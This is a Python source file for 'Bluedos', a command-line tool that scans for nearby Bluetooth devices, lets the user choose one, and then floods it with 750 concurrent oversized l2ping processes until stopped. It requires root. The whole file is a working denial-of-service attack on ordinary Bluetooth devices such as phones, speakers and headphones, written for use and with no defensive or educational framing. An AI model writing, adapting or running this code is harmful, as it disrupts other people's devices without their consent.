# coding=utf-8
"""Bluedos by @ceigh
gitlab.com/ceigh/bluedos/wikis"""
import os
import subprocess as sp
from time import sleep


def bye():
    print("\nBye!")
    sleep(1)
    print('\033c')  # Clear terminal
    exit(0)


def confirm(question: str) -> bool:
    try:
        while True:
            reply = input(f"{question}: ").lower()[:1]
            if reply in 'yjsd':  # international; hit <Enter> also here
                return True
            elif reply == 'n':
                return False
    except (KeyboardInterrupt, EOFError):  # <Ctrl+C>; <Ctrl+D>
        bye()


def get_devices() -> list:
    if not len(sp.check_output(['hcitool', 'dev'])[9:]):
        exit("Enable Bluetooth first")
    print("\033cScanning...\n")
    hcitool_out = sp.check_output(['hcitool', 'scan'])[13:-1]
    devices = [tuple(i.split('\t')[1:])
               for i in hcitool_out.decode().split('\n')
               if len(hcitool_out) != 0]
    return devices
    # [('00:00:00:00:00:00', 'Dev1'), ('11:11:11:11:11:11', 'Dev2')]


def attack(target: list):
    print(f"\033c\nTrying on '{target[1]}', please wait...")
    pids = [sp.Popen(['l2ping', '-f', '-s', '660', target[0]],
                     stdout=sp.DEVNULL).pid
            for p in range(750)]
    try:
        input(f"\033c\nAttacking '{target[1]}', press enter to stop... ")
    finally:
        from signal import SIGTERM
        [os.kill(pid, SIGTERM) for pid in pids]
        bye()


def main():
    devices = get_devices()
    if not devices:
        if not confirm("No devices around :(\nScan again?"):
            bye()  # Exit
        main()
    dev_number = len(devices)
    if dev_number == 1:
        target_i = 0
    else:
        print(f"\033c\n{dev_number} devices found:\n")
        [print(f"{index}) '{device[1]}'\t<{device[0]}>")
         for index, device
         in enumerate(devices)]
        while True:
            try:
                target_i = int(input(f"\nSelect a device (0-{dev_number - 1}): "))
                if target_i in range(dev_number):
                    break
            except ValueError:
                continue
            except (KeyboardInterrupt, EOFError):
                bye()
    attack(devices[target_i])


if __name__ == '__main__':
    if os.getuid():  # Root launch check
        exit("Run it as root")
    main()
